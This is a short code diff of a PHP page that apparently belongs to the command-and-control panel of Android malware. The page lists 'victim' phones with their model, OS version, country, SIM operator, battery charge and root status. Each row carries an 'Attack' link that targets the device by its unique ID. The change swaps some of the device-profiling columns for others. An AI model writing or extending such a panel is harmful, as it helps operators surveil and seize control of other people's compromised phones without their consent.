@@ -64,13 +64,11 @@ if(!isLogin()){
                             <thead>
                             <tr>
                                 <th>#</th>
-                                <th>IMEI</th>
-                                <th>PRODUCT</th>
-                                <th>MODEL</th>
+                                <th>DEVICE</th>
                                 <th>VERSION</th>
+                                <th>COUNTRY</th>
+                                <th>SIM OPERATOR</th>
                                 <th>CHARGE</th>
-                                <th>TOTAL RAM</th>
-                                <th>LANGUAGE</th>
                                 <th>IS ROOTED</th>
                                 <th>ACTION</th>
                             </tr>
@@ -86,13 +84,11 @@ if(!isLogin()){
 
                                 echo '<tr>';
                                 echo '<td>'.$index_victim.'</td>';
-                                echo '<td>'.$value['IMEI'].'</td>';
-                                echo '<td>'.$value['PHONE_PRODUCT'].'</td>';
-                                echo '<td>'.$value['PHONE_MODEL'].'</td>';
-                                echo '<td>'.$value['OS_VERSION'].'</td>';
+                                echo '<td>'.$value['DEVICE_MODEL'].'</td>';
+                                echo '<td>'.$value['SOFTWARE_VERSION'].'</td>';
+                                echo '<td>'.$value['COUNTRY'].'</td>';
+                                echo '<td>'.$value['SIM_OPERATOR'].'</td>';
                                 echo '<td>'.$value['CHARGE'].'</td>';
-                                echo '<td>'.$value['TOTAL_RAM'].'</td>';
-                                echo '<td>'.$value['DEVICE_LANGUAGE'].'</td>';
                                 echo '<td>'.$value['IS_ROOTED'].'</td>';
                                 echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'&type=1'.'">Attack</a></td>';
                                 echo '</tr>';
